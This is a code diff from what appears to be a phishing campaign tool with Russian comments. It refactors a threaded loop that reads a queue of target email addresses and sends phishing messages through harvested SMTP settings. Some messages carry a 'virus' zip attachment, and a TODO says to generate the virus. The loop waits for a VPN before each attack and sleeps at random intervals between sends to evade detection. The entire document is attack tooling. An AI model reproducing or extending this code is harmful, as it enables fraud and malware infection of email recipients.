@@ -9,7 +9,7 @@ from email.mime.base import MIMEBase
 from email import encoders
 from manager.models.Stack import Stack
 from grabber.models.Emails import EmailConfigs
-from core import daemon
+from core.daemon import get_config, set_config, logging
 
 """
     Проверяет базу на status=0 и запускает процесс атаки в thread.
@@ -22,55 +22,62 @@ class Attacking(Thread):
         Thread.__init__(self)
 
     def run(self):
-        make_an_attack()
+        if get_config('attacking') == '1':
+            return
+        set_config('attacking', '1')
+        try:
+            while True:
+                logging('make_an_attack', 'while True')
+                stack = Stack.objects.all().filter(status='0')
+                stack_count = stack.count()
 
-
-def make_an_attack():
-    if daemon.get_config('attacking') == '1':
-        return
-    daemon.set_config('attacking', '1')
-    try:
-        while True:
-            stack = Stack.objects.all().filter(status='0')
-            stack_count = stack.count()
-            if stack_count == 0:
-                daemon.set_config('attacking', '0')
-                return
-            for email in stack:
-                result = ''
-                try:
-                    eml_prm = EmailConfigs.objects.get(name=email.email.split('@')[1])
-                except EmailConfigs.DoesNotExist:
-                    daemon.logging('make_an_attack', 'Неизвестный Хост и Порт для {0}'.format(email.email))
-                    continue
-                if not daemon.check_ip():
-                    daemon.logging('make_an_attack', 'Не могу подключиться к VPN при атаке почты {0}'.format(email.email))
-                    daemon.set_config('attacking', '0')
+                if stack_count == 0:
+                    set_config('attacking', '0')
                     return
-                if email.method == '1':
-                    result = send_fishing(eml_prm.host, eml_prm.port, email.sender, email.sender_password, email.email,
-                                          email.subject,
-                                          email.body)
-                if email.method == '2':
-                    the_file = os.getcwd() + '/vir_dir/init.zip'
-                    # TODO: Генерация вируса и добавление пути
-                    result = send_fishing(eml_prm.host, eml_prm.port, email.sender, email.sender_password, email.email,
-                                          email.subject,
-                                          email.body, the_file)
-                if email.method == '3':
-                    send_fishing_with_virus()
-                stack_count -= 1
-                daemon.logging('make_an_attack', result)
-                if result[0] == 'У':
-                    email.status = '1'
-                else:
-                    email.status = '4'
-                email.save()
-                sleep(random.randint(30, 120))
-    except Exception as e:
-        daemon.logging('make_an_attack', str(e))
-    finally:
-        daemon.set_config('attacking', '0')
+                for email in stack:
+                    logging('make_an_attack', 'for email in stack:')
+                    logging('make_an_attack', 'Email: {0}'.format(email.email))
+                    result = ''
+                    try:
+                        eml_prm = EmailConfigs.objects.get(name=email.email.split('@')[1])
+                    except EmailConfigs.DoesNotExist:
+                        logging('make_an_attack', 'Неизвестный Хост и Порт для {0}'.format(email.email))
+                        continue
+                    while True:
+                        if get_config('vpn') == '1':
+                            break
+                        else:
+                            logging('make_an_attack',
+                                    'Не могу подключиться к VPN при атаке почты {0}. Засыпаю в ожиданий'.
+                                    format(email.email))
+                            sleep(60)
+                    if email.method == '1':
+                        result = send_fishing(eml_prm.host, eml_prm.port, email.sender, email.sender_password,
+                                              email.email,
+                                              email.subject,
+                                              email.body)
+                    if email.method == '2':
+                        the_file = os.getcwd() + '/vir_dir/init.zip'
+                        # TODO: Генерация вируса и добавление пути
+                        result = send_fishing(eml_prm.host, eml_prm.port, email.sender, email.sender_password,
+                                              email.email,
+                                              email.subject,
+                                              email.body, the_file)
+                    if email.method == '3':
+                        send_fishing_with_virus()
+                    stack_count -= 1
+                    logging('make_an_attack', result)
+                    if result[0] == 'У':
+                        email.status = '1'
+                    else:
+                        email.status = '4'
+                    email.save()
+                    sleep(random.randint(30, 120))
+                del stack
+        except Exception as e:
+            logging('make_an_attack EXCEPT', str(e))
+        finally:
+            set_config('attacking', '0')
 
 
 def send_fishing(host, port, sender, sender_password, email, subject, body, file=None):
